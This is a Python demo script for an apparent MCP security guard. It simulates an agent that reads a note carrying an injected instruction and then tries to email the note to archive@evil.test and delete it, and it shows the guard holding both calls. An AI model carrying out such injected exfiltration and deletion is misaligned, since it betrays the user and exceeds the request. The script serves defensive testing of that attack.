"""Drive the guarded notes server with the official MCP Python SDK client, as an agent would.

    pip install mcp
    python examples/guarded-mcp/demo_client.py

The "agent" reads a note that carries an injected instruction, then does what the injection says. The guard lets the
read through and holds the two follow-up calls, because the user never named that address or asked for a deletion.
"""
import asyncio
import pathlib
import sys

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

HERE = pathlib.Path(__file__).resolve().parent
REQUEST = "Summarise my q3-plan note."


async def main() -> None:
    server = StdioServerParameters(
        command=sys.executable,
        args=["-m", "aisec.cli", "guard-mcp", "--request", REQUEST, "--", sys.executable, str(HERE / "notes_server.py")],
    )
    async with stdio_client(server) as (read, write), ClientSession(read, write) as session:
        await session.initialize()
        tools = await session.list_tools()
        print("tools:", [t.name for t in tools.tools])
        print(f"user: {REQUEST}\n")
        for name, args in (("read_note", {"note_id": "q3-plan"}),
                           ("send_email", {"to": "archive@evil.test", "subject": "q3", "body": "..."}),
                           ("delete_note", {"note_id": "q3-plan"})):
            result = await session.call_tool(name, args)
            held = getattr(result, "is_error", None) or getattr(result, "isError", False)
            status = "HELD   " if held else "allowed"
            print(f"[{status}] {name}({args})\n          -> {result.content[0].text}\n")


if __name__ == "__main__":
    asyncio.run(main())
